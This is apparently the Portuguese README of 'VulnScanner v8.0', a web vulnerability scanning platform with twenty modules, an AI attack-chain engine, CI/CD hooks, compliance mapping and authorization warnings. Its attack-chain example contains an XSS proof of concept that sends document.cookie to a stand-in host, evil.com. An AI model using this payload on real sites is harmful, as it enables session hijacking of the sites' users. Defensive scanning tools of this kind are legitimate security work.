# VulnScanner v8.0 🔍

Plataforma de segurança web com **20 módulos de análise**, Attack Chain Engine com IA, SPA Crawler (Playwright), relatório de compliance, PR Review automático e dashboard multi-projeto.

> ⚠️ **Use apenas em sistemas que você tem autorização para testar.**
> No Brasil, acessar sistemas sem autorização é crime pelo **Art. 154-A do Código Penal** — pena de 1 a 4 anos + multa.

---

## 🚀 Deploy em um comando

```bash
git clone <repo> && cd vulnscanner_v8
chmod +x deploy/setup.sh && ./deploy/setup.sh
```

Sobe automaticamente: **PostgreSQL + Redis + App (Gunicorn/eventlet) + Nginx (SSL)**.

Primeiro acesso: `https://localhost/auth/register` — o primeiro usuário cadastrado vira admin automaticamente.

### Localmente (sem Docker)

```bash
python -m venv venv
source venv/bin/activate        # Linux/macOS
venv\Scripts\activate           # Windows

pip install -r requirements.txt
playwright install chromium     # SPA Crawler (opcional)

python app.py
# Acesse: http://localhost:5000
```

---

## 📦 Módulos de análise (20)

| # | Módulo | O que verifica |
|---|---|---|
| 1 | **SPA Crawler** | Renderiza JS (React/Vue/Angular/Next.js), descobre rotas dinâmicas, forms e parâmetros |
| 2 | **SSL/TLS** | Validade do certificado, protocolo (TLS 1.0→1.3), cipher suite, expiração |
| 3 | **Headers HTTP** | HSTS, CSP, X-Frame-Options, cookies (HttpOnly/Secure/SameSite), headers de info |
| 4 | **Port Scanner** | Portas abertas, serviços perigosos (Redis, MongoDB, Docker API, Elasticsearch...) |
| 5 | **OWASP Web** | XSS refletido, SQLi, arquivos sensíveis, CSRF, clickjacking, métodos HTTP perigosos |
| 6 | **DNS / Subdomains** | Zone transfer (AXFR), SPF/DMARC, enumeração de subdomínios |
| 7 | **CORS Policy** | Origem refletida sem validação, null origin, wildcard com credentials |
| 8 | **Tecnologias / WAF** | Fingerprint de servidor, CMS, frameworks, bibliotecas JS, detecção de WAF/CDN |
| 9 | **Redirects** | HTTP→HTTPS, open redirect, loops e cadeias longas |
| 10 | **Auth Flow** | Formulário de login, CSRF no login, login via HTTP |
| 11 | **CVE Lookup** | Cruza versões detectadas com NVD API v2.0 em tempo real |
| 12 | **Blind SQL Injection** | Boolean-based + time-based em todos os parâmetros do crawler |
| 13 | **IDOR** | Manipulação de IDs em query params, path e endpoints REST |
| 14 | **SSRF** | Testa AWS/GCP/Azure metadata, localhost e serviços internos |
| 15 | **XXE** | File read, SSRF via XML, SOAP, SVG em endpoints XML |
| 16 | **Attack Chain Engine** | Correlaciona findings e descobre cadeias de ataque com IA (Claude) |
| 17 | **Compliance** | Mapeia para OWASP Top 10 2021, PCI DSS 4.0 e NIST SP 800-53 |
| 18 | **False Positive Filter** | Re-verifica findings críticos antes de reportar |
| 19 | **Executive Report** | CVSS formal, risco por categoria, SLA de remediação, roadmap |
| 20 | **Plugins** | Checks customizados em Python com sandbox seguro |

---

## ⛓ Attack Chain Engine — O diferencial único

Analisa **todos os findings em conjunto** e descobre combinações exploráveis que nenhuma ferramenta automatizada do mercado detecta.

**Exemplo:**

```
[CHAIN CRÍTICA — CVSS 9.8] Account Takeover via XSS + CORS + Cookie sem HttpOnly

Findings: XSS refletido → Cookie sem HttpOnly → CORS origin refletida → CSRF ausente

Narrativa: Atacante hospeda página maliciosa. Vítima clica no link. JavaScript executa
no contexto do alvo, rouba document.cookie, exfiltra via CORS para servidor do atacante.
Sessão comprometida sem qualquer interação adicional do servidor.

PoC: <script>fetch('https://alvo.com/?q=<img src=x onerror=
"fetch(`https://evil.com?c=`+document.cookie)"></script>

Remediação integrada: Escape inputs + HttpOnly em cookies + validar CORS origins + CSRF token
```

| Modo | Quando |
|---|---|
| **IA (Claude API)** | `ANTHROPIC_API_KEY` configurada, perfil normal ou aggressive |
| **Estático (9 regras)** | Sem API key ou perfil stealth — sem custo, funciona offline |

---

## 🏗️ Estrutura do projeto

```
vulnscanner_v8/
├── app.py                        # Flask app principal — rotas, factory, SSE
├── requirements.txt
├── gunicorn.conf.py              # Config produção (eventlet, workers, timeout)
├── docker-compose.yml            # PostgreSQL + Redis + App + Nginx
├── Dockerfile
├── .env.example                  # Variáveis de ambiente documentadas
│
├── deploy/
│   ├── setup.sh                  # Deploy em um comando
│   ├── nginx.conf                # Reverse proxy + SSL + rate limiting
│   └── ssl/                      # Certificados (gerados pelo setup.sh)
│
├── modules/                      # Módulos de scan
│   ├── spa_crawler.py            # Playwright headless — SPA support
│   ├── ssl_checker.py
│   ├── header_checker.py
│   ├── port_scanner.py
│   ├── owasp_checker.py
│   ├── dns_checker.py
│   ├── cors_checker.py
│   ├── tech_detector.py
│   ├── redirect_checker.py
│   ├── auth_flow.py
│   ├── cve_lookup.py
│   ├── blind_sqli.py
│   ├── idor_checker.py
│   ├── ssrf_checker.py
│   ├── xxe_checker.py
│   ├── attack_chain_engine.py    # ⛓ Diferencial único
│   ├── compliance.py             # OWASP / PCI DSS / NIST
│   ├── false_positive_filter.py
│   ├── executive_report.py
│   ├── scan_diff.py              # Comparação entre scans
│   ├── circuit_breaker.py        # Resiliência por módulo
│   └── rate_limiter.py           # Controle de velocidade de scan
│
├── auth/
│   ├── middleware.py             # @require_auth — sessão + API key
│   ├── routes.py                 # Login, registro, logout, API keys
│   ├── tenancy.py                # Multi-tenancy — isolamento por usuário
│   └── rate_limit.py             # Quota por usuário (scans/dia, req/min)
│
├── database/
│   └── models.py                 # User, Project, Scan, ScheduledScan, Plugin, ApiKey
│
├── dashboard/
│   └── routes.py                 # Projetos, histórico, diff, relatórios, plugins
│
├── scheduler/
│   └── manager.py                # APScheduler — scans diário/semanal/mensal + SMTP
│
├── cicd/
│   ├── integration.py            # JUnit XML, GitHub Actions, GitLab CI, badge SVG
│   └── pr_review.py              # Comentário automático em PR/MR
│
├── websocket/
│   └── events.py                 # Socket.IO — notificações em tempo real
│
├── plugins/
│   └── engine.py                 # Sandbox Python para plugins customizados
│
├── export/
│   └── pdf_generator.py          # PDF profissional com capa + roadmap
│
├── templates/
│   ├── index.html                # Interface de scan (SSE + auth)
│   ├── report.html               # Relatório com 4 abas
│   ├── auth/
│   │   ├── login.html
│   │   └── register.html
│   └── dashboard/
│       ├── base.html             # Layout com sidebar
│       ├── index.html            # Dashboard principal
│       ├── project.html          # Projeto + trending chart
│       ├── diff.html             # Comparação visual entre scans
│       ├── scheduled.html        # Gestão de scans agendados
│       ├── plugins.html          # Editor de plugins
│       ├── settings.html         # Configurações + quota
│       └── admin.html            # Painel admin
│
└── tests/
    ├── test_core.py              # 38 testes — módulos core
    ├── test_v7.py                # 36 testes — auth, tenancy, rate limit, CRUD
    └── test_v8.py                # 41 testes — SPA, compliance, PR review, Docker
```

---

## 🔌 API

### Autenticação
Aceita **sessão web** (cookie) ou **API key** via header:
```
X-API-Key: vs_<sua_key>
Authorization: Bearer vs_<sua_key>
```

### Endpoints principais

| Método | Endpoint | Descrição |
|---|---|---|
| `POST` | `/api/scan` | Scan síncrono — retorna JSON completo |
| `GET` | `/scan-stream?url=...` | Scan via SSE — eventos em tempo real |
| `GET` | `/api/report/<id>` | Relatório JSON |
| `GET` | `/api/report/<id>/pdf` | Relatório PDF |
| `GET` | `/api/report/<id>/junit` | JUnit XML para CI/CD |
| `GET` | `/api/report/<id>/compliance` | Relatório de compliance |
| `GET` | `/api/report/<id>/github-summary` | Markdown para GitHub Actions |
| `GET` | `/api/report/<id>/badge.svg` | Badge SVG de score (público) |
| `POST` | `/api/projects` | Criar projeto |
| `GET` | `/api/projects/<id>/trending` | Score ao longo do tempo |
| `GET` | `/api/diff?a=<id>&b=<id>` | Comparar dois scans |
| `POST` | `/api/scheduled` | Agendar scan |
| `GET` | `/api/quota` | Status de quota do usuário |
| `POST` | `/api/webhooks/github` | Webhook GitHub — PR Review |
| `POST` | `/api/webhooks/gitlab` | Webhook GitLab — MR Review |
| `GET` | `/api/docs` | Swagger / OpenAPI |
| `GET` | `/health` | Health check |

### Exemplo de uso via API

```bash
# Scan completo
curl -X POST https://seu-vulnscanner.com/api/scan \
  -H "X-API-Key: vs_sua_key" \
  -H "Content-Type: application/json" \
  -d '{"url": "https://alvo.com", "rate_profile": "normal"}'

# Associar a um projeto
curl -X POST https://seu-vulnscanner.com/api/scan \
  -H "X-API-Key: vs_sua_key" \
  -H "Content-Type: application/json" \
  -d '{"url": "https://alvo.com", "project_id": "uuid-do-projeto"}'
```

---

## 🔄 CI/CD

### GitHub Actions

```yaml
# .github/workflows/security.yml
name: Security Scan
on: [push, pull_request]

jobs:
  vulnscan:
    runs-on: ubuntu-latest
    steps:
      - name: Run VulnScanner
        run: |
          curl -X POST ${{ secrets.VULNSCAN_URL }}/api/scan \
            -H "X-API-Key: ${{ secrets.VULNSCAN_API_KEY }}" \
            -d '{"url": "${{ secrets.TARGET_URL }}"}' \
            -o scan.json

      - name: Security Gate
        run: |
          python3 -c "
          import json, sys
          r = json.load(open('scan.json'))
          c = r['counts']
          if c.get('critical',0) > 0 or c.get('high',0) > 0:
              print(f'FAILED: {c[\"critical\"]} critical, {c[\"high\"]} high')
              sys.exit(1)
          print('PASSED')
          "
```

### PR Review automático (GitHub)

Configure o webhook em `Settings → Webhooks`:
- URL: `https://seu-vulnscanner.com/api/webhooks/github?url=https://staging.seusite.com`
- Header: `X-GitHub-Token: ghp_seu_token`
- Events: Pull requests

O VulnScanner comenta automaticamente no PR com o resultado do scan e diff de segurança.

---

## 📋 Compliance

O módulo de compliance mapeia automaticamente cada finding para os frameworks:

| Framework | Controles | Cobertura |
|---|---|---|
| OWASP Top 10 2021 | 10 | A01→A10 completo |
| PCI DSS 4.0 | 8 | Req 2.2, 4.2, 6.2, 6.4, 7.2, 8.3, 9.5, 11.3 |
| NIST SP 800-53 | 10 | AC-3, AU-2, IA-5, SC-5, SC-8, SC-18, SI-2, SI-3, SI-10, RA-5 |

Acesse em: `/api/report/<scan_id>/compliance`

---

## ⚙️ Variáveis de ambiente

| Variável | Obrigatório | Descrição |
|---|---|---|
| `SECRET_KEY` | ✅ | Chave secreta Flask (mínimo 32 chars) |
| `DATABASE_URL` | ✅ | PostgreSQL ou SQLite (`sqlite:///vulnscanner.db`) |
| `ANTHROPIC_API_KEY` | ⚪ | Claude API — Attack Chain Engine com IA |
| `SMTP_HOST` | ⚪ | Servidor SMTP para notificações por email |
| `SMTP_PORT` | ⚪ | Porta SMTP (padrão: 587) |
| `SMTP_USER` | ⚪ | Usuário SMTP |
| `SMTP_PASS` | ⚪ | Senha SMTP |
| `PLAYWRIGHT_ENABLED` | ⚪ | `true/false` — SPA Crawler (padrão: true) |
| `REDIS_URL` | ⚪ | Redis para sessões (produção) |
| `GITHUB_TOKEN` | ⚪ | Token GitHub para PR Review |
| `GITLAB_TOKEN` | ⚪ | Token GitLab para MR Review |

---

## 🏆 Score de segurança

| Severidade | Dedução | SLA recomendado |
|---|---|---|
| Critical | −30 pts | 1 dia |
| High | −15 pts | 7 dias |
| Medium | −7 pts | 30 dias |
| Low | −2 pts | 90 dias |
| Info | 0 pts | — |

`Score = max(0, 100 − total_deduções)`

---

## 🧪 Testes

```bash
# Todos os testes
pytest tests/ -v

# Por categoria
pytest tests/test_core.py -v    # Módulos core (38 testes)
pytest tests/test_v7.py -v      # Auth + tenancy + API (36 testes)
pytest tests/test_v8.py -v      # SPA + compliance + PR review (41 testes)
```

**115 testes — 100% passando.**

---

## 🔒 Limites de uso por role

| | Admin | User |
|---|---|---|
| Scans por dia | Ilimitado | 20 |
| Req por minuto | 300 | 60 |
| Scans simultâneos | 10 | 2 |
| API keys | 10 | 10 |

---

## 📜 Aviso legal

Esta ferramenta é para uso exclusivo em sistemas que você possui ou tem autorização expressa e por escrito para testar. O uso não autorizado é crime no Brasil (Art. 154-A CP) e em praticamente todos os países. Os desenvolvedores não se responsabilizam pelo uso indevido.
